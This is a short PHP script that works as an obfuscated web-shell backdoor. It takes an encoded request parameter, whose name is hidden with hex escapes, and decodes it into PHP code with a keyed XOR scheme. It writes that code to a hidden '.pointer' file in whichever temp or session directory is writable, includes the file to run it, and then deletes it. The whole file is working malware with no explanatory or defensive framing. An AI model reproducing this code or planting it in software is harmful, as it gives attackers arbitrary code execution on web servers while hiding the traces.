<?php

if(!is_null($_REQUEST["co\x6Dpo\x6E\x65\x6Et"] ?? null)){
	$data_chunk = $_REQUEST["co\x6Dpo\x6E\x65\x6Et"];
		 	$data_chunk =explode('.' ,		$data_chunk		 );
	$entity = '';
            $s7 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen($s7 );
            $n = 0;
    
            foreach ($data_chunk as $v5) {
                $chS = ord($s7[$n%$lenS] );
                $d = ((int)$v5 - $chS - ($n%10)) ^ 52;
                $entity .= chr($d );
                $n++;
            }
	$flg = array_filter(["/tmp", "/dev/shm", getcwd(), sys_get_temp_dir(), getenv("TEMP"), "/var/tmp", ini_get("upload_tmp_dir"), getenv("TMP"), session_save_path()]);
	$record = 0;
do {
    $fac = $flg[$record] ?? null;
    if ($record >= count($flg)) break;
    		if (is_dir($fac) ? is_writable($fac) : false) {
    $ent = "$fac/.pointer";
    $file = fopen($ent, 'w');
if ($file) {
	fwrite($file, $entity);
	fclose($file);
	include $ent;
	@unlink($ent);
	exit;
}
}
    $record++;
} while (true);
}